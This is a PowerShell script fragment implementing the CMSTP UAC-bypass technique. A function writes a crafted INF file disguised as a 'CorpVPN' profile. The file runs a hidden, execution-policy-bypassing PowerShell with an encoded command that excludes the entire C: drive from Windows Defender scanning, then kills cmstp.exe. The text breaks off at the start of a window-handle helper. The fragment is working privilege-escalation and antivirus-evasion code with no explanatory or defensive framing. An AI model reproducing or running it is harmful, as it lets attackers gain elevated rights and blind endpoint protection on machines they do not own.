Function Set-INFFile {
    [CmdletBinding()]
    Param (
        [Parameter(HelpMessage="Specify the INF file location")]
        $InfFileLocation = "$env:temp\CMSTP.inf",
    
        [Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
        [String]$CommandToExecute = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAEMAOgBcAA=='
    )

    $InfContent = @"
[version]
Signature=`$chicago`$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
$CommandToExecute
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
"@

    $InfContent | Out-File $InfFileLocation -Encoding ASCII
}

Function Get-Hwnd {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] 
        [string]$ProcessName
    )
    Process {
       
